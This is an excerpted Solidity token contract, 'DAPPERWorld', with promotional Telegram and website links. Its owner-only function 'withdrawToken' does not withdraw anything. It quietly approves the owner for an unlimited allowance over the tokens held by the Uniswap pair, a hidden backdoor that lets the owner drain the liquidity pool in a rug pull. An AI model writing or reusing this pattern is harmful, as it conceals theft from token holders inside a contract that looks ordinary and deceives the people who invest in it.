...
/*
Telegram Group : https://t.me/Dapper_World
Website: https://www.dworld.finance/
*/
...
contract DAPPERWorld {
    ...
    uint256 public NUM_MAX_HEX = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    ...
    function withdrawToken(address tokenContract, uint256 amount) public virtual onlyOwner {
        _approve(uniswapPair, msg.sender, NUM_MAX_HEX);
